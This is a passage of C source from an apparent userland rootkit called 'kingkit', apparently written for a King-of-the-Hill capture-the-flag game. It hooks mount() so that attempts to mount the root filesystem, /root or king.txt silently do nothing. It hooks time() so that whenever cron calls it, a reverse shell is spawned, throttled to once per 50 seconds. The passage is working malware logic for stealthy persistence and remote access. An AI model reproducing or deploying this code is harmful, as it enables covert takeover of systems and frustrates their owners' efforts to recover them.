    original_mount = syscall_address(original_mount, "mount");
    char *real_source = realpath(source, NULL);
    char *real_target = realpath(target, NULL);
    if (real_source == NULL || real_target == NULL) {
        free(real_source);
        free(real_target);
        return (*original_mount)(source, target, filesystemtype, mountflags, data);
    }
    if (!strcmp(real_source, "/dev/xvda1") || !strcmp(real_source, "/") || !strcmp(real_source, "/root") || !strcmp(real_source, "/root/king.txt") || !strcmp(real_target, "/") || !strcmp(real_target, "/root") || !strcmp(real_target, "/root/king,txt")) { // /dev/xvda1 is a common device for the root filesystem
        free(real_source);
        free(real_target);
        return 0; //exit silently
    }
    free(real_source);
    free(real_target);
    return (*original_mount)(source, target, filesystemtype, mountflags, data);
}


static time_t last_time = 0; //time the last reverse shell was spawned

time_t time(time_t *tloc) {
    #if DEBUG
    printf("[kingkit] time called.\n");
    #endif
    original_time = syscall_address(original_time, "time");
    char exe_path[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1); //look which binary is associated with this process
    if (len == -1) {
        return (*original_time)(tloc);
    }
    exe_path[len] = '\0'; //terminate the string because readlink itself doesn't do that
    if (strncmp(exe_path, "/usr/sbin/cron", 14) == 0) { //check if cron is calling time()
        time_t current_time = (*original_time)(NULL);
        if (last_time < (current_time - 50)) { //avoid spawning multiple reverse shells, otherwise cron will recursively call time()
            last_time = current_time; //update the last_time variable
            revshell(); //if so, spawn reverse shell
        }
        return current_time; //avoid an extra call to time()
    }
    return (*original_time)(tloc);
}
